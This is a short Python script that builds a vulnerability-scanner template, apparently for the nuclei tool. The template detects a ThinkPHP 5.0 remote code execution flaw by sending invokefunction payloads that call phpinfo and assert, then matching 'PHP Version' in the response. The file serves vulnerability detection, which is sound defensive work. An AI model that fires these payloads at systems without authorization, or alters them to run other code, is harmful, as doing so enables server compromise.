from nuclei import BaseHTTP
http = BaseHTTP(method="GET")
http.set_paths(
    paths=[
        r"{{BaseURL}}/?s=/Index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",
        r"{{BaseURL}}/?s=/Index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"
    ]
)
http.set_body_word_matcher(
    patterns=[
        "PHP Version"
    ]
)
http.dump(
    id="tp50_rce",
    fingers=[
        "thinkphp"
    ]
)